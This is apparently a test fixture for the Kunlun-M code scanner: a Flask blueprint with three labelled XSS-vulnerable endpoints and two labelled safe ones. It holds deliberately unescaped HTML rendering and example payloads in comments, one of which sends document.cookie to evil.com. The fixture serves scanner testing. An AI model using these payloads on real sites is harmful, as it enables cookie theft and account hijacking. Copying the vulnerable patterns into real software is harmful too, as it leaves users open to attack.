"""
Real-world XSS (Cross-Site Scripting) test cases for Kunlun-M scanner.
Simulates a Flask application with user-generated content endpoints.
"""

from flask import Blueprint, request, jsonify, make_response, Response
from markupsafe import escape

content_bp = Blueprint('content', __name__)


# ---------------------------------------------------------------------------
# VULN 1: make_response with user-controlled HTML content
# ---------------------------------------------------------------------------
@content_bp.route('/api/pages/view', methods=['GET'])
def view_page():
    """Render a user-created page."""
    title = request.args.get('title', 'Untitled')
    body = request.args.get('body', '')
    # VULN: User-controlled title and body injected into HTML response
    # Attacker can inject: title="<script>alert('xss')</script>"
    html = f'''
    <html>
    <head><title>{title}</title></head>
    <body>{body}</body>
    </html>
    '''
    response = make_response(html)
    response.headers['Content-Type'] = 'text/html'
    return response


# ---------------------------------------------------------------------------
# VULN 2: Response with user-controlled Content-Type and body
# ---------------------------------------------------------------------------
@content_bp.route('/api/content/render', methods=['POST'])
def render_content():
    """Render user-submitted HTML content."""
    content = request.form.get('html_content', '')
    # VULN: User HTML returned directly without sanitization
    # Attacker submits: html_content="<img src=x onerror=alert(1)>"
    return Response(content, mimetype='text/html')


# ---------------------------------------------------------------------------
# VULN 3: JSON response with reflected user input in HTML context
# ---------------------------------------------------------------------------
@content_bp.route('/api/comments/preview', methods=['POST'])
def preview_comment():
    """Preview a comment with user-supplied formatting."""
    username = request.form.get('username', 'Anonymous')
    comment = request.form.get('comment', '')
    # VULN: User input reflected in HTML without escaping
    # Attacker injects: username="<script>fetch('http://evil.com/steal?c='+document.cookie)</script>"
    preview_html = f'''
    <div class="comment">
        <span class="author">{username}</span> says:
        <p>{comment}</p>
    </div>
    '''
    return make_response(preview_html, 200, {'Content-Type': 'text/html'})


# ---------------------------------------------------------------------------
# SAFE 1: Using markupsafe.escape to sanitize user input
# ---------------------------------------------------------------------------
@content_bp.route('/api/comments/create', methods=['POST'])
def create_comment():
    """Create a comment with properly escaped output."""
    username = request.form.get('username', 'Anonymous')
    comment = request.form.get('comment', '')
    # SAFE: escape() converts <, >, &, ", ' to HTML entities
    safe_username = escape(username)
    safe_comment = escape(comment)
    html = f'<div class="comment"><b>{safe_username}</b>: {safe_comment}</div>'
    return Response(html, mimetype='text/html')


# ---------------------------------------------------------------------------
# SAFE 2: JSON response (no HTML context)
# ---------------------------------------------------------------------------
@content_bp.route('/api/comments/list', methods=['GET'])
def list_comments():
    """List comments as JSON (safe by default)."""
    page = request.args.get('page', '1')
    # SAFE: Returning JSON with Content-Type application/json is not vulnerable to XSS
    comments = [
        {'author': f'User {page}', 'text': 'Sample comment'},
    ]
    return jsonify({'comments': comments})
